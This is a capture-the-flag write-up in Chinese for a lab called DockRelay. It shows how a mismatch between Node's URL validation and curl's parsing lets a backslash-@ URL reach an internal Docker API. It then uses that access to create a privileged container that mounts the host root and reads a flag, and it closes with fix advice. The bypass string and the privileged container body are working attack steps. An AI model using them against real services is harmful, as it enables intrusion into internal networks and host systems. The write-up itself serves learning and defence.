# DockRelay WP

这次题目给源码，又给线上环境，读完源码我就觉得校验和发包裂开了。

## 先看给了什么

线上 scenario 接口说得很直。白名单主机是 hooks.partner.test，基线是 http://hooks.partner.test:8080/catalog，内部引擎是 engine-api:2375，只让碰白名单主机。

我顺手打了 catalog，拿回来的东西挺诚实。它说构建平面是 engine-api:2375，API 是 v1.47，预置镜像是 host-reader:1.0，还补了一句诊断中继永远不该直连内部构建平面。行，目标就定在 engine-api 了。

## 源码哪里裂开

policy.mjs 里校验用的是 new URL。协议必须 http，hostname 转小写后必须等于 hooks.partner.test。

fetcher.mjs 先调 enforcePartnerPolicy，过了才调 executeRawRequest。

curl-executor.mjs 是关键。它直接把原始字符串丢给 curl，注释还写了，故意传未经归一化的原始 URL。而且不走 shell，也不接受调用方传 curl 参数。

所以问题很直接。Node 和 curl 对同一个字符串理解不同。我本地试了下 Node 的行为，http 下反斜杠会被当成斜杠归一化掉。

能用的串长这样，中间是个单反斜杠：

```text
http://hooks.partner.test\@engine-api:2375/version
```

Node 看到的是白名单主机，归一化后变成 http://hooks.partner.test/@engine-api:2375/version。curl 看到的还是 @ 后面的 engine-api:2375。relay 的回包也证明了这点，validator.host 还是 hooks.partner.test，upstream 却已经是 Docker 的 version 数据了。

JSON 里要写双反斜杠才能发出单反斜杠，我一开始在这里折腾了几下。用 Node 组 payload 最省心，不用跟 shell 转义打架。

## 引擎能动哪些接口

绕过通了之后，我把 Docker 接口一个个摸了一遍。放行的不多。

```text
/version 通，拿到 1.47
/images/json 通，看到 host-reader:1.0
/_ping 通
/containers/create 通，但有门禁
/containers/ID/start，json，logs，wait 通
```

拦掉的回包也很直白。读容器列表，读镜像详情，看 info，看网络和卷，调 exec，全部 403。exec 被拦有点烦，但后面发现不需要它。

建容器时门禁分两步卡我。第一次说 lab 策略要求 Privileged=true。第二次说要求只读绑定 /:/host:ro。我就按它要的凑齐。

最后建成功的 body 长这样：

```json
{
  "Image": "host-reader:1.0",
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host:ro"]
  }
}
```

回 201，给了容器 ID。start 回 204。查 json 能看到 /host 挂载确实是 Source / 只读，入口是 /entrypoint.sh，容器已经退出，退出码 0。

## 拿 flag

entrypoint 已经把活干了，直接读 logs 就行：

```text
NESTED_HOST_PROOF_BEGIN
flag{550a982c-1d3e-445e-a562-2cba7f079c9f}
NESTED_HOST_PROOF_END
```

我复核了下 json 里的挂载和状态，确认是宿主根目录只读挂进来后跑出来的结果。本地临时 payload 删了，仓库没动。

修的话也不复杂。别再校验一套、发包用另一套。要么校验归一化后的最终 URL，要么直接拒绝 URL 里出现反斜杠和 @ 混用的写法。现在这种写法，Node 觉得没事，curl 直接拐走了。
